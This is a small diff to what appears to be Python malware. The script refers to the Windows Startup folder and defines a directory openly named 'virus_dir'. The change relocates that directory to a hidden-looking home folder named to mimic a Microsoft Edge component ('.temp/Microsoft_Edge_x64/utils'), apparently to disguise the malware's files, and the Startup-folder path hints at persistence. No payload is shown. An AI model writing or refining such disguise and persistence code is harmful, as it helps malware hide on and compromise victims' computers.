@@ -22,10 +22,10 @@ shell_startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 
 appdata = os.environ['APPDATA']
 
 virus_dir = os.path.join(
-    appdata, 
-    "Microsoft", 
-    "Edge", 
-    "Temp"
+    home_dir,
+    ".temp",
+    "Microsoft_Edge_x64",
+    "utils"
 )
 os.makedirs(virus_dir, exist_ok=True)
 
